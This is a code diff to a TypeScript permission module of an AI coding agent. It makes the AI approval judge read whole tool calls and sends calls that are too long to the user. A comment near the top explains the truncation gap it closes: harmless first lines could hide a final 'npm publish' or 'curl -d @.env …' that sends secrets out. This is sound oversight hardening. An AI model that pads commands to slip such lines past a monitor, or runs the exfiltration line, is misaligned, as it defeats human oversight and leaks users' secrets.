@@ -28,8 +28,16 @@ import { threeZone } from "../../policy.ts";
 import { subAgentUserGoal } from "../../swarm/brief.ts";
 import { clip, type KyrnRuntime } from "../runtime.ts";
 import { isShellTool } from "../shell-tools.ts";
-import { describeCall } from "./constraints.ts";
-import { FLAG_CODES, FLAG_ZH, RISK_CONFIRM_CHARS, riskExcerpt, riskFlag } from "./guard.ts";
+import {
+	commandLines,
+	FLAG_CODES,
+	FLAG_ZH,
+	RISK_COMMAND_CHARS,
+	RISK_CONFIRM_CHARS,
+	readWhole,
+	riskExcerpt,
+	riskFlag,
+} from "./guard.ts";
 import type { HarnessRoots } from "./inherit.ts";
 
 /** Session entry: the mode this conversation was switched to. A reopened conversation keeps it. */
@@ -40,9 +48,18 @@ const PENDING_STATUS = "mu.permissions.pending";
 /**
  * Why the user is being asked. `nojudge` and `judgedown` are judge mode without a verdict: no judge can answer yet
  * (no usable key or credit, or none trusted with approvals, so every step asks), or the judge did not answer this
- * time (down, too slow, a broken answer).
+ * time (down, too slow, a broken answer). `long`: the call is too long for the judge to read whole (`approvalCall`).
  */
-export type AskReason = "ask" | "unsure" | "beyond" | "unrelated" | "flagged" | "protected" | "nojudge" | "judgedown";
+export type AskReason =
+	| "ask"
+	| "unsure"
+	| "beyond"
+	| "unrelated"
+	| "flagged"
+	| "protected"
+	| "nojudge"
+	| "judgedown"
+	| "long";
 
 const KIND_TEXT: Readonly<Record<PermissionKind, { zh: string; en: string }>> = {
 	edit: { zh: "改文件", en: "edit a file" },
@@ -70,7 +87,31 @@ const REASON_TEXT: Readonly<Record<Exclude<AskReason, "flagged">, { zh: string; 
 		en: "No judge is available yet, so mu asks you about every step.",
 	},
 	judgedown: { zh: "判定器这次没有回答，所以先问你。", en: "The judge didn't answer this time, so mu is asking you." },
+	long: {
+		zh: "这一步太长，判定器读不全，所以先问你。",
+		en: "This step is too long for the judge to read in full, so mu is asking you.",
+	},
 };
+
+/**
+ * How much of a call the approval judge reads: all of it, up to here. Cut at 400 characters and run into one line as it
+ * was, a script passed on its first lines while all of it ran: `npm ci && npm test` up front, `npm publish` or
+ * `curl -d @.env …` on the last line. In mubench's real captures, 539 of the 2,333 calls put to the judge had been cut;
+ * in 963 commands of mu's own sessions, none was longer than this. A longer call is not put to the judge.
+ */
+export const APPROVAL_CALL_CHARS = 4000;
+
+/**
+ * A call as the approval judge reads it, and whether that is all of it: a command as its lines (`commandLines`), any
+ * other call as its whole input, since a field the judge is not shown (an MCP tool's `to`) runs too.
+ */
+export function approvalCall(toolName: string, input: unknown): { text: string; whole: boolean } {
+	const record = typeof input === "object" && input !== null ? (input as Record<string, unknown>) : {};
+	const shell = isShellTool(toolName) || toolName === "bg_start";
+	const text = `${toolName}: ${shell ? commandLines(String(record.command ?? "")) : JSON.stringify(record)}`;
+	if (text.length <= APPROVAL_CALL_CHARS) return { text, whole: true };
+	return { text: `${text.slice(0, APPROVAL_CALL_CHARS - 1)}…`, whole: false };
+}
 
 /** The answers, fixed so a client can draw them as buttons. */
 export const ANSWERS = {
@@ -207,7 +248,13 @@ export function registerPermissions(runtime: KyrnRuntime, roots: HarnessRoots | 
 		flag: string | undefined,
 		ctx: ExtensionContext,
 	): Promise<{ approved: boolean; reason: AskReason }> => {
-		const call = `${event.toolName}: ${clip(describeCall(event.toolName, event.input), 400)}`;
+		// The judge vouches only for what it read, and what runs is the whole call: one too long to read is the user's.
+		// Starting subagents is the exception, as their every step is put to the judge again.
+		const call = approvalCall(event.toolName, event.input);
+		const readAll = need.kind !== "delegate";
+		const command = String((event.input as { command?: unknown }).command ?? "");
+		if (flag ? commandLines(command).length > RISK_COMMAND_CHARS : !call.whole && readAll)
+			return { approved: false, reason: flag ? "flagged" : "long" };
 		// In a sub-agent the message and the frame are what the parent's model wrote: only the user's goal vouches.
 		const inherited = subAgentUserGoal();
 		const userMessage = clip(inherited ?? runtime.turn.userMessage, 400);
@@ -222,15 +269,15 @@ export function registerPermissions(runtime: KyrnRuntime, roots: HarnessRoots | 
 		if (flag) {
 			const decision = await runtime.engine.decide(
 				toolRisk,
-				// The whole command, or every part a rule flagged: the judge cannot weigh what it cannot see.
-				{ command: riskExcerpt(String((event.input as { command?: unknown }).command ?? "")), userMessage, flag },
+				{ command: commandLines(command), userMessage, flag },
 				{ signal: ctx.signal },
 			);
 			// The user chose the judge to decide, so its verdict counts in shadow too; no verdict means asking. A rule
 			// flagged the call, so only the judge being sure the user asked for it runs it.
 			const requested = decision.answers?.requested;
 			const asked = requested?.type === "boolean" && threeZone(requested) === "yes";
-			return { approved: asked && (decision.judged ?? decision.outcome) === "allow", reason: "flagged" };
+			const allowed = asked && (decision.judged ?? decision.outcome) === "allow";
+			return { approved: allowed && readWhole(decision), reason: "flagged" };
 		}
 		const frame = runtime.frame;
 		const input = event.input as Record<string, unknown>;
@@ -247,7 +294,7 @@ export function registerPermissions(runtime: KyrnRuntime, roots: HarnessRoots | 
 					600,
 				),
 				userMessage,
-				call,
+				call: call.text,
 				where:
 					need.kind === "outside"
 						? "outside the project folder"
@@ -261,7 +308,9 @@ export function registerPermissions(runtime: KyrnRuntime, roots: HarnessRoots | 
 			{ signal: ctx.signal },
 		);
 		const verdict = decision.judged ?? decision.outcome;
-		if (verdict === "approve") return { approved: true, reason: "ask" };
+		// A judge with a bounded window that cut the state did not read the whole call either.
+		if (verdict === "approve")
+			return readWhole(decision) || !readAll ? { approved: true, reason: "ask" } : { approved: false, reason: "long" };
 		return { approved: false, reason: unanswered(decision) ?? verdict };
 	};
 
@@ -276,8 +325,8 @@ export function registerPermissions(runtime: KyrnRuntime, roots: HarnessRoots | 
 			reason === "flagged"
 				? say({ zh: `危险操作：${FLAG_ZH[flag ?? ""] ?? flag}。`, en: `Risky: ${flag}.` })
 				: say(REASON_TEXT[reason]);
-		// A flagged or protected call is decided each time: a grant for its first word would cover what comes next.
-		const grant = flag || need.protected ? undefined : need.grant;
+		// A flagged, protected or long call is decided each time: a grant for its first word would cover what comes next.
+		const grant = flag || need.protected || reason === "long" ? undefined : need.grant;
 		if (!ctx.hasUI) {
 			return {
 				block: true,
@@ -318,8 +367,9 @@ export function registerPermissions(runtime: KyrnRuntime, roots: HarnessRoots | 
 			picked = await ctx.ui.select(
 				[
 					say({ zh: `mu 想${KIND_TEXT[need.kind].zh}，需要你授权`, en: `mu wants to ${KIND_TEXT[need.kind].en}` }),
-					// A flagged command shows the parts its flag is about, which a summary cut at a fixed length can leave out.
-					flag
+					// A flagged command shows the parts its flag is about, which a summary cut at a fixed length can leave out,
+					// and a long command as much of itself as a person reads at once.
+					flag || (reason === "long" && typeof (event.input as { command?: unknown }).command === "string")
 						? riskExcerpt(String((event.input as { command?: unknown }).command ?? ""), RISK_CONFIRM_CHARS)
 						: need.summary,
 					why,
